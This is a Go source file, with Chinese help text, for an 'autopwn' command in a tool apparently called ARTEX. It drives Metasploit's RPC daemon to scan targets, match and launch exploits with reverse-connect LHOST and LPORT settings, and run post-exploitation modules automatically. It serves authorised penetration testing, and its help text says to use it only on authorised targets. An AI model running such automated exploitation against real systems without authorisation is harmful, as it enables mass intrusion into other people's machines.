package autopwn

import (
	"bufio"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/Autumn-27/artex/msfrpc"
)

// ParsePorts accepts "21,22,80" and ranges "1-1024,8080,9000-9100".
func ParsePorts(spec string) ([]int, error) {
	spec = strings.TrimSpace(spec)
	if spec == "" {
		return nil, nil
	}
	seen := map[int]bool{}
	var out []int
	for _, part := range strings.Split(spec, ",") {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}
		if lo, hi, ok := strings.Cut(part, "-"); ok {
			l, err1 := strconv.Atoi(strings.TrimSpace(lo))
			h, err2 := strconv.Atoi(strings.TrimSpace(hi))
			if err1 != nil || err2 != nil || l < 1 || h > 65535 || l > h {
				return nil, fmt.Errorf("端口段非法：%q", part)
			}
			for p := l; p <= h; p++ {
				if !seen[p] {
					seen[p] = true
					out = append(out, p)
				}
			}
			continue
		}
		p, err := strconv.Atoi(part)
		if err != nil || p < 1 || p > 65535 {
			return nil, fmt.Errorf("端口非法：%q", part)
		}
		if !seen[p] {
			seen[p] = true
			out = append(out, p)
		}
	}
	return out, nil
}

// DetectLHOST guesses the local address that can reach target (UDP dial does not
// send a packet, it only asks the kernel for a route).
func DetectLHOST(target string) string {
	conn, err := net.Dial("udp", net.JoinHostPort(target, "9"))
	if err != nil {
		return ""
	}
	defer func() { _ = conn.Close() }()
	if addr, ok := conn.LocalAddr().(*net.UDPAddr); ok {
		return addr.IP.String()
	}
	return ""
}

// Main implements `artex autopwn`: the one-command closed loop.
//
// It resolves targets, makes sure msfrpcd is up (starting it when needed),
// authenticates, then runs scan → identify → match → exploit → post and prints
// both a human report and (optionally) a JSON summary.
//
// Exit codes: 0 = run completed and produced a session (or dry-run),
// 1 = completed without any session, 2 = setup/authentication failure.
func Main(args []string) int {
	fs := flag.NewFlagSet("autopwn", flag.ContinueOnError)
	fs.SetOutput(os.Stderr)
	var (
		targets     = fs.String("targets", "", "目标，逗号分隔（如 10.0.0.5,10.0.0.6）")
		targetFile  = fs.String("targets-file", "", "目标清单文件（每行一个）")
		ports       = fs.String("ports", "", "扫描端口，如 21,22,80 或 1-1024,8080（默认内置常见端口）")
		lhost       = fs.String("lhost", "", "反弹回连地址（默认自动探测本机到目标的出口 IP）")
		lport       = fs.Int("lport", 4444, "反弹回连端口")
		msfHost     = fs.String("msf-host", "127.0.0.1", "msfrpcd 地址")
		msfPort     = fs.Int("msf-port", 55553, "msfrpcd 端口")
		msfUser     = fs.String("msf-user", "msf", "msfrpcd 用户名")
		msfPass     = fs.String("msf-pass", "", "msfrpcd 密码（缺省读 ARTEX_MSF_RPC_PASSWORD；自动拉起时随机生成）")
		msfSSL      = fs.Bool("msf-ssl", false, "msfrpcd 是否 TLS（ARTEX 自己拉起的实例用明文）")
		startMSF    = fs.Bool("start-msf", true, "端口不通时自动启动 msfrpcd（用 -start-msf=false 关闭）")
		startWait   = fs.Int("start-wait", 180, "等待自动拉起的 msfrpcd 就绪的秒数（冷启动 20-60s，机器负载高时更久）")
		dryRun      = fs.Bool("dry-run", false, "只扫描与规划，不执行任何模块")
		post        = fs.Bool("post", true, "拿到会话后自动跑后渗透模块")
		maxExploits = fs.Int("max-exploits", 3, "每个目标最多尝试几个候选（上限 8）")
		waitSecs    = fs.Int("wait", 25, "每次尝试等待会话的秒数")
		scanTimeout = fs.Int("scan-timeout", 2, "单端口超时（秒）")
		jsonOut     = fs.String("json", "", "把结果摘要写入该 JSON 文件（- 表示 stdout）")
		quiet       = fs.Bool("quiet", false, "只输出结论，不打过程日志")
		total       = fs.Duration("timeout", 30*time.Minute, "整体超时")
	)
	if err := fs.Parse(args); err != nil {
		return 2
	}

	list := splitTargets(*targets)
	if *targetFile != "" {
		fromFile, err := readTargets(*targetFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[x] 读取目标清单失败：%v\n", err)
			return 2
		}
		list = append(list, fromFile...)
	}
	if len(list) == 0 {
		fmt.Fprintln(os.Stderr, "[x] 没有目标：用 -targets 或 -targets-file 指定（仅对授权目标使用）")
		fs.Usage()
		return 2
	}
	portList, err := ParsePorts(*ports)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[x] %v\n", err)
		return 2
	}

	logf := func(format string, a ...any) {
		if *quiet {
			return
		}
		fmt.Fprintf(os.Stderr, format+"\n", a...)
	}

	ctx := context.Background()
	if *total > 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, *total)
		defer cancel()
	}

	password := strings.TrimSpace(*msfPass)
	if password == "" {
		password = strings.TrimSpace(os.Getenv("ARTEX_MSF_RPC_PASSWORD"))
	}
	generated := password == ""
	password = PasswordOrRandom(password)

	if *startMSF {
		daemon, err := EnsureDaemon(ctx, *msfHost, *msfPort, password, time.Duration(*startWait)*time.Second, logf)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[x] %v\n", err)
			return 2
		}
		defer daemon.Stop()
		if generated && daemon != nil {
			logf("[!] 本次随机生成 RPC 密码：%s（已写入本次拉起的 msfrpcd）", password)
		}
	}

	client := msfrpc.New(msfrpc.Options{Host: *msfHost, Port: *msfPort, SSL: *msfSSL})
	defer client.Close()
	if err := client.Login(ctx, *msfUser, password); err != nil {
		fmt.Fprintf(os.Stderr, "[x] 连接 msfrpcd 失败：%v\n", err)
		return 2
	}

	lh := strings.TrimSpace(*lhost)
	if lh == "" {
		lh = DetectLHOST(list[0])
		if lh == "" {
			fmt.Fprintln(os.Stderr, "[x] 无法自动探测 LHOST，请用 -lhost 指定平台可达地址")
			return 2
		}
		logf("[*] 自动探测 LHOST=%s（用 -lhost 可覆盖）", lh)
	}

	engine := New(client, Options{
		Targets: list, Ports: portList, LHOST: lh, LPORT: *lport,
		MaxExploits: *maxExploits, WaitSession: time.Duration(*waitSecs) * time.Second,
		ScanTimeout: time.Duration(*scanTimeout) * time.Second,
		Post:        *post, Evidence: true, DryRun: *dryRun, Log: logf,
	})
	sum := engine.Run(ctx)
	if len(engine.Options().Targets) == 0 {
		fmt.Fprintln(os.Stderr, "[x] 目标为空")
		return 2
	}

	printSummary(sum, *quiet)

	if *jsonOut != "" {
		blob, err := json.MarshalIndent(sum, "", "  ")
		if err != nil {
			fmt.Fprintf(os.Stderr, "[x] 序列化结果失败：%v\n", err)
			return 1
		}
		if *jsonOut == "-" {
			fmt.Println(string(blob))
		} else if err := os.WriteFile(*jsonOut, blob, 0o644); err != nil {
			fmt.Fprintf(os.Stderr, "[x] 写 JSON 失败：%v\n", err)
			return 1
		} else {
			fmt.Fprintf(os.Stderr, "[+] 结果已写入 %s\n", *jsonOut)
		}
	}

	if *dryRun || len(sum.Sessions()) > 0 {
		return 0
	}
	return 1
}

func printSummary(sum *Summary, quiet bool) {
	var b strings.Builder
	fmt.Fprintf(&b, "\n=== autopwn 结果（Metasploit %s，%.1fs）===\n",
		orDash(sum.MSFVersion), sum.Finished.Sub(sum.Started).Seconds())
	for _, r := range sum.Results {
		fmt.Fprintf(&b, "\n[%s]\n", r.Target)
		if len(r.Ports) > 0 {
			var ps []string
			for _, f := range r.Ports {
				label := fmt.Sprintf("%d/%s", f.Port, f.Service)
				if f.Product != "" {
					label += "(" + f.Product + ")"
				}
				ps = append(ps, label)
			}
			fmt.Fprintf(&b, "  开放端口 : %s\n", strings.Join(ps, ", "))
		}
		if len(r.Candidates) > 0 {
			fmt.Fprintf(&b, "  候选模块 : %s\n", candidateNames(r.Candidates, len(r.Candidates)))
		}
		for _, a := range r.Attempts {
			state := "无会话"
			if a.Session != "" {
				state = "session " + a.Session
			}
			if a.Error != "" {
				state = "错误: " + a.Error
			}
			fmt.Fprintf(&b, "  尝试     : %-55s %s（%.1fs）\n", a.Module, state, a.Duration.Seconds())
		}
		for _, s := range r.Sessions {
			fmt.Fprintf(&b, "  会话     : #%s %s %s 证据=%s\n", s.ID, s.Type, s.Peer, orDash(s.Evidence))
		}
		for _, p := range r.Post {
			status := "ok"
			if p.Error != "" {
				status = p.Error
			}
			fmt.Fprintf(&b, "  后渗透   : %s（session %s，%s）\n", p.Module, p.Session, status)
		}
		if r.Note != "" {
			fmt.Fprintf(&b, "  说明     : %s\n", r.Note)
		}
		if r.Error != "" {
			fmt.Fprintf(&b, "  错误     : %s\n", r.Error)
		}
	}
	sessions := sum.Sessions()
	fmt.Fprintf(&b, "\n总计：%d 目标，%d 会话\n", len(sum.Results), len(sessions))
	if !quiet {
		fmt.Print(b.String())
	}
}

func splitTargets(s string) []string {
	var out []string
	for _, t := range strings.Split(s, ",") {
		if t = strings.TrimSpace(t); t != "" {
			out = append(out, t)
		}
	}
	return out
}

func readTargets(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer func() { _ = f.Close() }()
	var out []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		out = append(out, line)
	}
	return out, sc.Err()
}

func orDash(s string) string {
	if strings.TrimSpace(s) == "" {
		return "-"
	}
	return s
}
